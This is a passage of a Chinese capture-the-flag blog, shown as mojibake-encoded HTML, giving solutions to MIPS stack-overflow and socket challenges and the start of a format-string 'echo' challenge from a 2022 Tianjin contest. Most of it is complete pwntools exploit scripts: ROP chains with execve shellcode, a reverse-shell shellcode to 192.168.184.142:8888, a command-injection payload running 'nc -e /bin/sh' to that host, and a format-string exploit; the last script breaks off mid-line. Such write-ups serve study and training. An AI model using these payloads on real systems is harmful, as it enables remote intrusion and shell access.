class="hljs-built_in">s0</span>, <span class="hljs-number">0x18</span>+var_s0($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C50 <span class="hljs-number">08</span> <span class="hljs-number">00</span> <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   <span class="hljs-keyword">jr </span>     $<span class="hljs-built_in">t9</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C54 <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-keyword">BD </span><span class="hljs-number">27</span>                   <span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">sp</span>, <span class="hljs-number">0x30</span><br></code></pre></td></tr></table></figure><p>æœ€åä½¿ç”¨mipsrop.stackfinders()æ‰¾åˆ°è·å–æ ˆåœ°å€çš„ç›¸å¯¹åç§»çš„gadgetï¼›ä½¿ç”¨mipsrop.tail()æˆ–mipsrop.find(â€œâ€)æ‰¾åˆ°è·³è½¬åœ°å€çš„gadgetï¼Œé€šè¿‡åç§»é‡å†™å…¥shellcodeï¼Œæ‰¾å‡ºå¦‚ä¸‹gadgetï¼š</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs maxima">.text:<span class="hljs-number">0001B230</span> <span class="hljs-number">21</span> C8 <span class="hljs-number">00</span> <span class="hljs-number">02</span>                   move    $t9, $s0<br>.text:<span class="hljs-number">0001B234</span> <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br>.text:<span class="hljs-number">0001B238</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> A4 <span class="hljs-number">27</span>                   addiu   $a0, $sp, <span class="hljs-number">0x38</span>+var_10<br><br>.text:<span class="hljs-number">000214A0</span> <span class="hljs-number">21</span> C8 <span class="hljs-number">80</span> <span class="hljs-number">00</span>                   move    $t9, $a0<br>.text:<span class="hljs-number">000214A4</span> <span class="hljs-number">18</span> <span class="hljs-number">00</span> A2 AF                   sw      $v0, <span class="hljs-number">0x30</span>+var_18($sp)<br>.text:<span class="hljs-number">000214A8</span> <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br>.text:<span class="hljs-number">000214AC</span> <span class="hljs-number">18</span> <span class="hljs-number">00</span> A4 <span class="hljs-number">27</span>                   addiu   $a0, $sp, <span class="hljs-number">0x30</span>+var_18<br></code></pre></td></tr></table></figure><p>â€‹                             </p><p>å®Œæ•´çš„ROPå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>libcbase = <span class="hljs-number">0x3fee5000</span><br><br>_sleep = libcbase + <span class="hljs-number">0x2f2b0</span><br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    slti $a2, $zero, -1</span><br><span class="hljs-string">    li $t7, 0x69622f2f</span><br><span class="hljs-string">    sw $t7, -12($sp)</span><br><span class="hljs-string">    li $t6, 0x68732f6e</span><br><span class="hljs-string">    sw $t6, -8($sp)</span><br><span class="hljs-string">    sw $zero, -4($sp)</span><br><span class="hljs-string">    la $a0, -12($sp)</span><br><span class="hljs-string">    slti $a1, $zero, -1</span><br><span class="hljs-string">    li $v0, 4011</span><br><span class="hljs-string">    syscall 0x40404</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>payload =  <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x1fc</span> + p32(libcbase + <span class="hljs-number">0xafe0</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s0</span><br>payload += p32(libcbase + <span class="hljs-number">0x21c34</span>)    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>     <span class="hljs-comment">#s2</span><br>payload += p32(_sleep)    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s5</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s6</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s7</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#fp</span><br>payload += p32(libcbase + <span class="hljs-number">0x2fb10</span>)    <span class="hljs-comment">#ra</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += p32(libcbase + <span class="hljs-number">0x214a0</span>)    <span class="hljs-comment">#s0</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s2</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += p32(libcbase + <span class="hljs-number">0x1b230</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span><br>payload += shellcode<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(payload)<br></code></pre></td></tr></table></figure><p>æœ€åè°ƒç”¨è¯¥payload</p><img src="/img/5/Screenshot_20221111_032920.png" style="zoom:67%;" /><h4 id="é¢˜å¤–è¯"><a href="#é¢˜å¤–è¯" class="headerlink" title="é¢˜å¤–è¯"></a>é¢˜å¤–è¯</h4><p>H4loå¸ˆå‚…ç¬¬ä¸€ä¸ªç‰ˆæœ¬çš„ROPé€šè¿‡mipsrop.stackfinders()æ˜¯æ‰¾åˆ° <code>0x000171CC</code> è¿™ä¸€å¤„çš„ gadgetï¼š</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel">.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>CC <span class="hljs-number">18</span> <span class="hljs-number">00</span> A4 <span class="hljs-number">27</span>                   addiu   $a0, $sp, <span class="hljs-number">0x38</span>+var_20<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>D0 <span class="hljs-number">21</span> C8 <span class="hljs-number">60</span> <span class="hljs-number">02</span>                   <span class="hljs-keyword">move</span>    $t9, $s3<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>D4 <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>D8 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">24</span>                   li      $a1, <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æœ€åä¹Ÿæ˜¯é€šè¿‡<code>0x000214A0</code> çš„gadgetè·³è½¬åˆ°shellcodeï¼Œ<code>0x000171CC</code> å¤„çš„ gadgetè·å–æ ˆåœ°å€çš„ç›¸å¯¹åç§»æ˜¯sp + 0x18ï¼Œå¹¶ä¾æ­¤å†™å…¥0x18å­—èŠ‚çš„æ•°æ®å¡«å……ï¼Œç„¶åå†™å…¥shellcodeï¼Œè€Œ<code>0x000214A0</code> å¤„ä¼šæœ‰<code>sw   $v0, 0x18($sp)</code>çš„æ“ä½œï¼Œæœ€åä¼šå°†shellcodeçš„å‰4ä½å­—èŠ‚èµ‹å€¼ä¸º$v0å¯„å­˜å™¨çš„å€¼ï¼Œå¦‚ä¸‹å›¾ï¼š</p><img src="/img/5/Screenshot_20221110_053319.png" style="zoom: 80%;" /><p>è™½ç„¶æœ€åä¹Ÿå¯ä»¥æˆåŠŸæ‰§è¡Œshellcodeï¼Œä½†æ˜¯å¯¹äºåé¢çš„socket_bofè¿™ç§é¢˜å°±æ— æ³•æˆåŠŸï¼›æ‰€ä»¥æœ€å¥½ç»§ç»­å¤šå†™å…¥4å­—èŠ‚çš„æ•°æ®å¡«å……ï¼Œç„¶åå†™å…¥shellcodeï¼Œè¿™æ ·å°±ä¸ä¼šè®©shellcodeä¸Šçš„æ•°æ®è¢«ä¿®æ”¹ã€‚</p><p>ä¸è¿‡H4loå¸ˆå‚…ç¬¬äºŒä¸ªç‰ˆæœ¬çš„ROPå°±æ²¡æœ‰ä½¿ç”¨è¯¥å¤„çš„gadgetã€‚</p><h3 id="socket-bof"><a href="#socket-bof" class="headerlink" title="socket_bof"></a>socket_bof</h3><p>ä½¿ç”¨idaæŸ¥çœ‹ä¼ªä»£ç ï¼š</p><p><img src="/img/5/Screenshot_20221111_090157.png"></p><p>readå‡½æ•°è¾“å…¥å­—ç¬¦åˆ°v10ä¸Šåï¼Œå†ç”±sprintfå‡½æ•°å°†v10çš„å­—ç¬¦åŠ ä¸Šâ€œnom nom nom, you sent me â€è¿™ä¸²å­—ç¬¦ä¸€åŒå¤åˆ¶åˆ°v11ä¸Šï¼Œæœ€åçš„æº¢å‡ºä¹Ÿæ˜¯v11çš„æº¢å‡ºï¼Œæ‰€ä»¥åœ¨è°ƒè¯•æ—¶åœ¨æ ˆä¸Šåº”æ‰¾åˆ°å¦‚ä¸‹åœ°å€å»è®¡ç®—æº¢å‡ºé•¿åº¦ï¼š</p><img src="/img/5/Screenshot_20221111_093723.png" style="zoom: 80%;" /><p>æº¢å‡ºåçš„ROPå¯ä»¥ç›´æ¥ä½¿ç”¨ä¸Šä¸€é¢˜stack_bof_02çš„ï¼Œæœ€åå°†shellcodeæ”¹ä¸ºå¯ä»¥åå¼¹shellçš„ä»£ç ã€‚</p><p>å¯ä»¥å‚è€ƒshell-stormä¸Šçš„<a href="http://shell-storm.org/shellcode/files/shellcode-860.html">ä»£ç </a>ï¼Œå†æ”¹ä¸€ä¸‹ipå’Œç«¯å£å³å¯</p><p>å®Œæ•´expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>libcbase = <span class="hljs-number">0x3fee5000</span><br>_sleep = libcbase + <span class="hljs-number">0x2f2b0</span><br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    slti $a0, $zero, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4006</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    slti $a0, $zero, 0x1111</span><br><span class="hljs-string">    li $v0, 4006</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $t4, 0xFFFFFFFD</span><br><span class="hljs-string">    not $a0, $t4</span><br><span class="hljs-string">    li $v0, 4006</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $t4, 0xFFFFFFFD</span><br><span class="hljs-string">    not $a0, $t4</span><br><span class="hljs-string">    not $a1, $t4</span><br><span class="hljs-string">    slti $a2, $zero, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4183</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    andi $a0, $v0, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4041</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string">    li $v0, 4041</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    lui $a1, 0xB821 # Port: 8888</span><br><span class="hljs-string">    ori $a1, 0xFF01</span><br><span class="hljs-string">    addi $a1, $a1, 0x0101</span><br><span class="hljs-string">    sw $a1, -8($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $a1, 0x8EB8A8C0 # IP: 192.168.184.142</span><br><span class="hljs-string">    sw $a1, -4($sp)</span><br><span class="hljs-string">    addi $a1, $sp, -8</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $t4, 0xFFFFFFEF</span><br><span class="hljs-string">    not $a2, $t4</span><br><span class="hljs-string">    li $v0, 4170</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    lui $t0, 0x6962</span><br><span class="hljs-string">    ori $t0, $t0,0x2f2f</span><br><span class="hljs-string">    sw $t0, -20($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    lui $t0, 0x6873</span><br><span class="hljs-string">    ori $t0, 0x2f6e</span><br><span class="hljs-string">    sw $t0, -16($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    slti $a3, $zero, 0xFFFF</span><br><span class="hljs-string">    sw $a3, -12($sp)</span><br><span class="hljs-string">    sw $a3, -4($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    addi $a0, $sp, -20</span><br><span class="hljs-string">    addi $t0, $sp, -20</span><br><span class="hljs-string">    sw $t0, -8($sp)</span><br><span class="hljs-string">    addi $a1, $sp, -8</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    addiu $sp, $sp, -20</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    slti $a2, $zero, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4011</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">51</span> + p32(libcbase + <span class="hljs-number">0xafe0</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s0</span><br>payload += p32(libcbase + <span class="hljs-number">0x21c34</span>)    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>     <span class="hljs-comment">#s2</span><br>payload += p32(_sleep)    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s5</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s6</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s7</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#fp</span><br>payload += p32(libcbase + <span class="hljs-number">0x2fb10</span>)    <span class="hljs-comment">#ra</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += p32(libcbase + <span class="hljs-number">0x214a0</span>)    <span class="hljs-comment">#s0</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s2</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += p32(libcbase + <span class="hljs-number">0x1b230</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span><br>payload += shellcode<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œexp</p><p><img src="/img/5/Screenshot_20221111_090644.png"></p><h3 id="socket-cmd"><a href="#socket-cmd" class="headerlink" title="socket_cmd"></a>socket_cmd</h3><p>ä½¿ç”¨snprintfå‡½æ•°ï¼Œæ§åˆ¶å¤§å°ä¸º0x64ï¼Œç¨‹åºæ— æ ˆæº¢å‡ºæ¼æ´ã€‚å°†v10çš„å­—ç¬¦ç›´æ¥æ‹¿å»å’Œâ€œecho â€æ‹¼æ¥åå»ä½œä¸ºsystemçš„å‚æ•°ï¼Œç„¶åè¾“å‡ºå­—ç¬¦ä¸²ï¼›å¯ä»¥ä½¿ç”¨â€˜&amp;â€™å­—ç¬¦ï¼Œå½“æ‰§è¡Œå®Œè¾“å‡ºåç»§ç»­æ‰§è¡Œè‡ªå·±å†™å…¥çš„å‘½ä»¤ã€‚</p><p><img src="/img/5/Screenshot_20221112_023231.png"></p><p>å°±æœ‰å¦‚ä¸‹expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>cmd = <span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>payload = <span class="hljs-string">b&#x27;a &amp;&#x27;</span> + cmd<br>p.sendafter(<span class="hljs-string">b&#x27;Send me a string:&#x27;</span>, payload)<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥åå¼¹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>cmd = <span class="hljs-string">b&#x27;nc -e /bin/sh 192.168.184.142 8888&#x27;</span><br>payload = <span class="hljs-string">b&#x27;a &amp;&#x27;</span> + cmd<br>p.sendafter(<span class="hljs-string">b&#x27;Send me a string:&#x27;</span>, payload)<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œåï¼š<br><img src="/img/5/Screenshot_20221112_023610.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022å¤©æ´¥å¸‚å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç½‘ç»œæ”»é˜²å†³èµ› pwn</title>
    <link href="/2022/11/05/%E5%A4%A9%E6%B4%A5%E5%B8%82%E6%94%BB%E9%98%B2/"/>
    <url>/2022/11/05/%E5%A4%A9%E6%B4%A5%E5%B8%82%E6%94%BB%E9%98%B2/</url>
    
    <content type="html"><![CDATA[<p>æ¯”èµ›æ—¶é—´åªæœ‰3ä¸ªå°æ—¶ï¼Œè¿™é‡Œæˆ‘åªå†™å‡ºäº†echoã€heroï¼Œè¿˜ä¸€é“choiceæ²¡æ—¶é—´å»å†™äº†ï¼Œåç»­è‡ªå·±åœ¨æœ¬åœ°å¤ç°äº†ä¸€ä¸‹ã€‚</p><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p><img src="/img/3/Screenshot_20221105_115756.png"></p><p>å…ˆåˆ©ç”¨æ ¼å¼å­—ç¬¦ä¸²è¯»å‡ºcanaryçš„å€¼ç»•è¿‡æ£€æŸ¥</p><p>åˆ©ç”¨æ ¼å¼å­—ç¬¦ä¸²ä¿®æ”¹0x601068åœ°å€çš„å€¼ï¼Œä¿®æ”¹ä¸ºå­—ç¬¦ä¸²<code>/bin/sh\x00</code></p><p>å†åˆ©ç”¨æ ˆæº¢å‡ºå’Œsystemå‡½æ•°æ‰§è¡ŒROP</p><p><img src="/img/3/Screenshot_20221105_121837.png"></p><p>å¼€å§‹æˆ‘æƒ³ä¸€æ¬¡æ€§ä¿®æ”¹å¤šä¸ªå­—èŠ‚ï¼Œä½†å¥½åƒæœ‰canaryä»¥åŠç¼“å†²åŒºå¤ªå°çš„åŸå› ï¼Œå½“æ—¶ä¸€ç›´ä¸æˆåŠŸï¼Œæ‰€ä»¥å°±æ¯æ¬¡åªä¿®æ”¹ä¸€ä¸ªå­—èŠ‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;echo&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./echo&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;172.31.1.105&#x27;</span>,<span class="hljs-number">50004</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>bss = <span class="hljs-number">0x601068</span><br><br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;%11$p&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br>bin_sh = <span class="hljs-number">0x0068732f6e69622f</span><br><br>pay = <span class="hljs-string">b&#x27;%47c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%98c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">1</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%105c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">2</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%110c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">3</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%47c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">4</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%115c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">5</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%104c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">6</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">7</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br><br>payload = <span 